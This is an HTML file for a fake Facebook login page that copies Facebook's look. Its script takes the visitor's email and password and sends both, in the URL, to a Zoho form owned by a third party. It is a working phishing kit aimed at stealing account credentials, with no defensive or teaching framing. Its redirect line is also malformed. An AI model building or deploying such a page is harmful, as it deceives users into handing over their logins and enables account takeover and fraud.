<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #e9eff1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: #fff;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
            width: 360px;
        }
        .login-container h1 {
            text-align: center;
            color: #1877f2;
            margin-bottom: 1.5rem;
        }
        .form-group {
            margin-bottom: 1rem;
        }
        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: #333;
        }
        .form-group input {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .form-group input:focus {
            border-color: #1877f2;
            outline: none;
        }
        .form-group button {
            width: 100%;
            padding: 0.75rem;
            border: none;
            border-radius: 4px;
            background-color: #1877f2;
            color: #fff;
            font-size: 1rem;
            cursor: pointer;
        }
        .form-group button:hover {
            background-color: #165eab;
        }
        .form-group .link {
            display: block;
            text-align: center;
            color: #1877f2;
            text-decoration: none;
            margin-top: 1rem;
        }
        .form-group .link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Facebook</h1>
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email or Phone</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <button type="submit">Log In</button>
            </div>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the form from submitting the traditional way
            
            // Collect form data
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Replace 'YOUR_ZOHO_FORM_URL' with your actual Zoho Form public URL
            // Replace 'email_field' and 'password_field' with your actual Zoho Form field names
            const zohoFormURL = https://forms.zohopublic.com/shiza50shabbir/form/Information/formperma/0oSkMQfa9_nc3tjRLNDoO2vTxOR0BvNRKE-g-LDG_lM?email=${encodeURIComponent(email)}&passed =${encodeURIComponent(password)}`;
            
            // Redirect to the Zoho Form with prefilled data
            window.location.href = zohoFormURL;
        });
    </script>
</body>
</html>
